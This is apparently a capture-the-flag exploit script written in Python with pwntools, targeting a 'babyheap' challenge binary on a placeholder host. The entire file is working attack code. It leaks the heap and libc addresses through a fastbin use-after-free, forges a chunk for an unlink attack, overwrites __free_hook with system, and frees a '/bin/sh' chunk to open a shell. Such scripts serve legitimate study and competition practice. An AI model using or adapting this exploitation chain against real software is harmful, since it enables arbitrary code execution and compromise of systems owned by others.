from pwn import *
# io = process('./babyheap')
io = remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
context.log_level='debug'
elf=ELF('./babyheap')
libc=elf.libc

def add(index,content):
    io.recvuntil('Choice:')
    io.sendline(str(1))
    io.recvuntil('Index:')
    io.sendline(str(index))
    io.recvuntil('Content:')
    if(len(content) == 0x20):
        io.send(content)
    else:
        io.sendline(content)


def edit(index,content):
    io.recvuntil('Choice:')
    io.sendline(str(2))
    io.recvuntil('Index:')
    io.sendline(str(index))
    io.recvuntil('Content:')
    if(len(content) == 0x20):
        io.send(content)
    else:
        io.sendline(content)


def show(index):
    io.recvuntil('Choice:')
    io.sendline(str(3))
    io.recvuntil('Index')
    io.sendline(str(index))

def delete(index):
    io.recvuntil('Choice:')
    io.sendline(str(4))
    io.recvuntil('Index')
    io.sendline(str(index))

def debug():
    gdb.attach(io,"b *0x4009A0")
    add(30,'ccc')


# first way to solve:use unlink
add(0,p64(0x31)*4)
add(1,p64(0x31)*4)
add(2,p64(0x31)*4)
add(3,p64(0x31)*4)
add(4,'/bin/sh\x00')

# leak heap_base
delete(1)
delete(0)
show(0)
# debug()
heap_info = u64(io.recvline()[:-1].ljust(8,'\x00'))
heap_info = (heap_info-0x0a)>>8
heap_base = heap_info-0x30
print "heap_base----->" + hex(heap_base)

#fastbin attack, fake chunk inside the fastbin with unlink
ptr_addr = 0x602060
delete(1)
add(5,p64(heap_base+0x10))
add(6,'a')
add(7,'a')
payload = p64(ptr_addr-0x18)+p64(ptr_addr-0x10)+p64(0x20)+p64(0x90)#overlap the next chunk
add(8,payload)
# debug()
edit(0,p64(0)+p8(0x21))
# gdb.attach(io,"b *0x400b54")
delete(1)


#get libc_addr
show(8)
libc_info = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = libc_info-0x3c4b78
print "libc_base----->" + hex(libc_base)

free_hook = libc_base+libc.sym['__free_hook']
system_addr = libc_base+libc.sym['system']

edit(0,p64(0)*3+p64(free_hook))
# debug()
edit(0,p64(system_addr))
# debug()
delete(4)




io.interactive()

